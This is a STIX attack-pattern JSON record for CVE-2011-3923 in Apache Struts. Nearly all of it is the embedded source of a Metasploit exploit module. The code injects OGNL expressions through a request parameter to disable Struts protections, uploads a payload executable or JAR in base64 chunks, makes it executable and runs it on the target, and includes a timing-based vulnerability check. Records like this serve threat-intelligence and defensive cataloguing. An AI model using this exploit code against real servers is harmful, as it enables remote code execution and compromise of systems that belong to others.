{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8d25ca75-e433-4c40-abdc-835b96d268a3",
    "created": "2024-08-14T17:09:43.564152Z",
    "modified": "2024-08-14T17:09:43.564156Z",
    "name": "Apache Struts ParametersInterceptor Remote Code Execution",
    "description": " This module exploits a remote command execution vulnerability in Apache Struts versions < 2.3.1.2. This issue is caused because the ParametersInterceptor allows for the use of parentheses which in turn allows it to interpret parameter values as OGNL expressions during certain exception handling for mismatched data types of properties which allows remote attackers to execute arbitrary Java code via a crafted parameter. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/struts_code_exec_parameters.rb",
            "external_id": "struts_code_exec_parameters.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3923"
        },
        {
            "source_name": "reference",
            "url": "http://blog.o0o.nu/2012/01/cve-2011-3923-yet-another-struts2.html"
        },
        {
            "source_name": "reference",
            "url": "https://cwiki.apache.org/confluence/display/WW/S2-009"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Struts ParametersInterceptor Remote Code Execution',\n      'Description'    => %q{\n        This module exploits a remote command execution vulnerability in Apache Struts\n        versions < 2.3.1.2. This issue is caused because the ParametersInterceptor allows\n        for the use of parentheses which in turn allows it to interpret parameter values as\n        OGNL expressions during certain exception handling for mismatched data types of\n        properties which allows remote attackers to execute arbitrary Java code via a\n        crafted parameter.\n      },\n      'Author'         =>\n        [\n          'Meder Kydyraliev', # Vulnerability Discovery and PoC\n          'Richard Hicks <scriptmonkey.blog[at]gmail.com>', # Metasploit Module\n          'mihi', #ARCH_JAVA support\n          'Christian Mehlmauer' # Metasploit Module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2011-3923'],\n          [ 'OSVDB', '78501'],\n          [ 'URL', 'http://blog.o0o.nu/2012/01/cve-2011-3923-yet-another-struts2.html'],\n          [ 'URL', 'https://cwiki.apache.org/confluence/display/WW/S2-009']\n        ],\n      'Platform'      => %w{ java linux win },\n      'Privileged'     => true,\n      'Targets'        =>\n        [\n          ['Windows Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            }\n          ],\n          ['Linux Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            }\n          ],\n          [ 'Java Universal',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'java'\n            },\n          ]\n        ],\n      'DisclosureDate' => '2011-10-01',\n      'DefaultTarget' => 2))\n\n      register_options(\n        [\n          Opt::RPORT(8080),\n          OptString.new('PARAMETER',[ true, 'The parameter to perform injection against.','username']),\n          OptString.new('TARGETURI', [ true, 'The path to a struts application action', '/blank-struts2/login.action']),\n          OptInt.new('CHECK_SLEEPTIME', [ true, 'The time, in seconds, to ask the server to sleep while check', 5]),\n          OptString.new('GET_PARAMETERS', [ false, 'Additional GET Parameters to send. Please supply in the format \"param1=a&param2=b\". Do apply URL encoding to the parameters names and values if needed.', nil]),\n          OptString.new('TMP_PATH', [ false, 'Overwrite the temp path for the file upload. Sometimes needed if the home directory is not writeable. Ensure there is a trailing slash!', nil])\n    ])\n  end\n\n  def parameter\n    datastore['PARAMETER']\n  end\n\n  def temp_path\n    return nil unless datastore['TMP_PATH']\n    unless datastore['TMP_PATH'].end_with?('/') || datastore['TMP_PATH'].end_with?('\\\\')\n      fail_with(Failure::BadConfig, 'You need to add a trailing slash/backslash to TMP_PATH')\n    end\n    datastore['TMP_PATH']\n  end\n\n  def get_parameter\n    retval = {}\n    return retval unless datastore['GET_PARAMETERS']\n    splitted = datastore['GET_PARAMETERS'].split('&')\n    return retval if splitted.nil? || splitted.empty?\n    splitted.each { |item|\n      name, value = item.split('=')\n      # no check here, value can be nil if parameter is &param\n      decoded_name = name ? Rex::Text::uri_decode(name) : nil\n      decoded_value = value ? Rex::Text::uri_decode(value) : nil\n      retval[decoded_name] = decoded_value\n    }\n    retval\n  end\n\n  def execute_command(cmd)\n    junk = Rex::Text.rand_text_alpha(6)\n    inject = \"(#context[\\\"xwork.MethodAccessor.denyMethodExecution\\\"]= new java.lang.Boolean(false),#_memberAccess[\\\"allowStaticMethodAccess\\\"]\"\n    inject << \"= new java.lang.Boolean(true),#{cmd})('#{junk}')\"\n    uri = normalize_uri(datastore['TARGETURI'])\n    resp = send_request_cgi({\n      'uri'     => uri,\n      'version' => '1.1',\n      'method'  => 'GET',\n      'vars_get' => { parameter => inject, \"z[(#{parameter})(#{junk})]\" => 'true' }.merge(get_parameter)\n    })\n    resp\n  end\n\n  def exploit\n    #Set up generic values.\n    payload_exe = rand_text_alphanumeric(4 + rand(4))\n\n    append = false\n    #Now arch specific...\n    case target['Platform']\n    when 'linux'\n      pl_exe = generate_payload_exe\n      path = temp_path || '/tmp/'\n      payload_exe = \"#{path}#{payload_exe}\"\n      chmod_cmd = \"@java.lang.Runtime@getRuntime().exec(\\\"/bin/sh_-c_chmod +x #{payload_exe}\\\".split(\\\"_\\\"))\"\n      exec_cmd = \"@java.lang.Runtime@getRuntime().exec(\\\"/bin/sh_-c_#{payload_exe}\\\".split(\\\"_\\\"))\"\n    when 'java'\n      payload_exe = \"#{temp_path}#{payload_exe}.jar\"\n      pl_exe = payload.encoded_jar.pack\n      exec_cmd = ''\n      exec_cmd << \"#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdkChecked'),\"\n      exec_cmd << \"#q.setAccessible(true),#q.set(null,true),\"\n      exec_cmd << \"#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdk15'),\"\n      exec_cmd << \"#q.setAccessible(true),#q.set(null,false),\"\n      exec_cmd << \"#cl=new java.net.URLClassLoader(new java.net.URL[]{new java.io.File('#{payload_exe}').toURI().toURL()}),\"\n      exec_cmd << \"#c=#cl.loadClass('metasploit.Payload'),\"\n      exec_cmd << \"#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.String;')}).invoke(\"\n      exec_cmd << \"null,new java.lang.Object[]{new java.lang.String[0]})\"\n    when 'win'\n      pl_exe = generate_payload_exe\n      path = temp_path || './'\n      payload_exe = \"#{path}#{payload_exe}.exe\"\n      exec_cmd = \"@java.lang.Runtime@getRuntime().exec('#{payload_exe}')\"\n    else\n      fail_with(Failure::NoTarget, 'Unsupported target platform!')\n    end\n\n    print_status(\"Uploading exploit to #{payload_exe}\")\n    #Now with all the arch specific stuff set, perform the upload.\n    #109 = length of command string plus the max length of append.\n    sub_from_chunk = 109 + payload_exe.length + datastore['TARGETURI'].length + parameter.length\n    chunk_length = 2048 - sub_from_chunk\n    chunk_length = ((chunk_length/4).floor) * 3\n    while pl_exe.length > chunk_length\n      java_upload_part(pl_exe[0,chunk_length], payload_exe, append)\n      pl_exe = pl_exe[chunk_length,pl_exe.length - chunk_length]\n      append = true\n    end\n    java_upload_part(pl_exe, payload_exe, append)\n    print_status(\"Executing payload\")\n    execute_command(chmod_cmd) if target['Platform'] == 'linux'\n    execute_command(exec_cmd)\n    register_files_for_cleanup(payload_exe)\n  end\n\n  def java_upload_part(part, filename, append = false)\n    cmd = \"\"\n    cmd << \"#f=new java.io.FileOutputStream('#{filename}',#{append}),\"\n    cmd << \"#f.write(new sun.misc.BASE64Decoder().decodeBuffer('#{Rex::Text.encode_base64(part)}')),\"\n    cmd << \"#f.close()\"\n    execute_command(cmd)\n  end\n\n  def check\n    sleep_time = datastore['CHECK_SLEEPTIME']\n    check_cmd = \"@java.lang.Thread@sleep(#{sleep_time * 1000})\"\n    t1 = Time.now\n    vprint_status(\"Asking remote server to sleep for #{sleep_time} seconds\")\n    response = execute_command(check_cmd)\n    t2 = Time.now\n    delta = t2 - t1\n\n    if response.nil?\n      return Exploit::CheckCode::Safe\n    elsif delta < sleep_time\n      return Exploit::CheckCode::Safe\n    else\n      return Exploit::CheckCode::Appears\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-10-01",
    "x_mitre_platforms": [
        "java"
    ]
}